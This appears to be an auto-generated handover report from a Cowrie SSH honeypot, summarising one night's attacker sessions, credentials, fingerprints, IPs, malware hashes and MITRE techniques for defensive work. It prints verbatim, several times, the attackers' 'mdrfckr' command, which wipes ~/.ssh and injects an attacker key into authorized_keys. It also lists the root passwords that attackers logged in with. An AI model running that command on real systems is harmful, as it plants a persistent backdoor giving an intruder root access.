# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-28 |
| **Generated At** | 2026-05-28T23:21:11Z |
| **Shift Time** | 23:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **460** |
| Confirmed Threats | **458** |
| False Positives Filtered | **2** (0.4%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **10** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **456** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **8** |
| Unique Credential Pairs | **6** |
| Unique Usernames | **4** |
| Unique Passwords | **6** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `345gs5662d34` | 2 |
| `soporte` | 1 |
| `user8` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `soporte` | 1 |
| `Google@123` | 1 |
| `ASD123asd` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `soporte` | `soporte` | 1 |
| `root` | `Google@123` | 1 |
| `root` | `ASD123asd` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Google@123` | `43.112.68.201` | 2026-05-28T21:27:40 |
| `root` | `3245gs5662d34` | `43.112.68.201` | 2026-05-28T21:27:46 |
| `root` | `ASD123asd` | `123.204.19.191` | 2026-05-28T22:17:47 |
| `root` | `3245gs5662d34` | `123.204.19.191` | 2026-05-28T22:17:50 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **460** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 9 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 7 | 3 |
| `713bd9cc9355...` | Mirai/variant | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 7 | 3 | Mirai/variant |
| `713bd9cc9355...` | libssh | 1 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.112.68.201`, `123.204.19.191`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **15** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS45538` | ODS Joint Stock Company | 1 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 1 | MEDIUM |
| `AS55990` | Huawei Cloud Service data center | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS62068` | SpectraIP B.V. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1cfefcb4cede

| Field | Detail |
|---|---|
| **Source IP** | `43.112.68[.]201` |
| **First Seen** | 2026-05-28 21:27 |
| **Last Seen** | 2026-05-28 21:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 21:27:39` | `cowrie.session.connect` |
| `2026-05-28 21:27:39` | `cowrie.client.version` |
| `2026-05-28 21:27:40` | `cowrie.client.kex` |
| `2026-05-28 21:27:40` | `cowrie.login.success` |
| `2026-05-28 21:27:41` | `cowrie.session.params` |
| `2026-05-28 21:27:41` | `cowrie.command.input` |
| `2026-05-28 21:27:41` | `cowrie.command.failed` |
| `2026-05-28 21:27:41` | `cowrie.log.closed` |
| `2026-05-28 21:27:42` | `cowrie.session.params` |
| `2026-05-28 21:27:42` | `cowrie.command.input` |
| `2026-05-28 21:27:42` | `cowrie.session.file_download` |
| `2026-05-28 21:27:42` | `cowrie.log.closed` |
| `2026-05-28 21:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.112.68[.]201` to AbuseIPDB if not already reported
- [ ] Block `43.112.68[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84c210f6d407

| Field | Detail |
|---|---|
| **Source IP** | `43.112.68[.]201` |
| **First Seen** | 2026-05-28 21:27 |
| **Last Seen** | 2026-05-28 21:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 21:27:45` | `cowrie.session.connect` |
| `2026-05-28 21:27:45` | `cowrie.client.version` |
| `2026-05-28 21:27:45` | `cowrie.client.kex` |
| `2026-05-28 21:27:46` | `cowrie.login.success` |
| `2026-05-28 21:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.112.68[.]201` to AbuseIPDB if not already reported
- [ ] Block `43.112.68[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca6222c62433

| Field | Detail |
|---|---|
| **Source IP** | `123.204.19[.]191` |
| **First Seen** | 2026-05-28 22:17 |
| **Last Seen** | 2026-05-28 22:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 22:17:46` | `cowrie.session.connect` |
| `2026-05-28 22:17:46` | `cowrie.client.version` |
| `2026-05-28 22:17:46` | `cowrie.client.kex` |
| `2026-05-28 22:17:47` | `cowrie.login.success` |
| `2026-05-28 22:17:47` | `cowrie.session.params` |
| `2026-05-28 22:17:47` | `cowrie.command.input` |
| `2026-05-28 22:17:47` | `cowrie.command.failed` |
| `2026-05-28 22:17:47` | `cowrie.log.closed` |
| `2026-05-28 22:17:47` | `cowrie.session.params` |
| `2026-05-28 22:17:47` | `cowrie.command.input` |
| `2026-05-28 22:17:48` | `cowrie.session.file_download` |
| `2026-05-28 22:17:48` | `cowrie.log.closed` |
| `2026-05-28 22:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.204.19[.]191` to AbuseIPDB if not already reported
- [ ] Block `123.204.19[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0fb458a2ad1

| Field | Detail |
|---|---|
| **Source IP** | `123.204.19[.]191` |
| **First Seen** | 2026-05-28 22:17 |
| **Last Seen** | 2026-05-28 22:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 22:17:50` | `cowrie.session.connect` |
| `2026-05-28 22:17:50` | `cowrie.client.version` |
| `2026-05-28 22:17:50` | `cowrie.client.kex` |
| `2026-05-28 22:17:50` | `cowrie.login.success` |
| `2026-05-28 22:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.204.19[.]191` to AbuseIPDB if not already reported
- [ ] Block `123.204.19[.]191` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.68.20[.]220` | **419** | 2026-05-28 20:27 | 2026-05-28 23:18 | 393m | 0 | `T1592` | 🟠 MEDIUM |
| `112.78.1[.]125` | **11** | 2026-05-28 20:28 | 2026-05-28 20:56 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `103.242.104[.]81` | **8** | 2026-05-28 20:38 | 2026-05-28 22:00 | 4m | 0 | `T1592` | 🟢 LOW |
| `3.17.207[.]148` | **3** | 2026-05-28 20:38 | 2026-05-28 20:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `135.148.33[.]168` | **2** | 2026-05-28 20:52 | 2026-05-28 22:33 | 1m | 0 | `T1592` | 🟢 LOW |
| `206.189.25[.]100` | **2** | 2026-05-28 20:28 | 2026-05-28 20:42 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.47.8[.]188` | 1 | 2026-05-28 20:46 | 2026-05-28 20:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.46.184[.]6` | 1 | 2026-05-28 20:37 | 2026-05-28 20:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.156.212[.]96` | 1 | 2026-05-28 21:58 | 2026-05-28 21:59 | 15s | 0 | `T1592` | 🟢 LOW |
| `123.204.19[.]191` | 1 | 2026-05-28 22:17 | 2026-05-28 22:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `149.255.39[.]70` | 1 | 2026-05-28 22:41 | 2026-05-28 22:42 | 37s | 0 | `T1592` | 🟢 LOW |
| `206.189.25[.]100` | 1 | 2026-05-28 22:53 | 2026-05-28 22:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.112.68[.]201` | 1 | 2026-05-28 21:27 | 2026-05-28 21:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-28 22:22 | 2026-05-28 22:23 | 57s | 0 | `T1592` | 🟢 LOW |
| `50.35.168[.]148` | 1 | 2026-05-28 22:48 | 2026-05-28 22:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `123.204.19[.]191` | TW | Seednet-TaipeiDP-S | **100** ⚠️ | 0 |
| `138.68.20[.]220` | US | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `103.242.104[.]81` | ID | PT Lintas Jaringan Nusantara | **100** ⚠️ | 5 |
| `43.112.68[.]201` | US | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 1 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 8 |
| `3.17.207[.]148` | US | Amazon Technologies Inc. | **100** ⚠️ | 38 |
| `50.35.168[.]148` | US | Ziply Fiber | **100** ⚠️ | 31 |
| `120.46.184[.]6` | CN | Huawei Public Cloud Service (Huawei Software Technologies Ltd.Co) | **100** ⚠️ | 9 |
| `121.156.212[.]96` | KR | Korea Telecom | **100** ⚠️ | 16 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 9 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 460 cases |
| Tool 34  | Credential Extractor        | ✅ 8 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (0.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 15 recon entry/entries in table (6 group(s) consolidating 445 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-28T23:21:11Z_
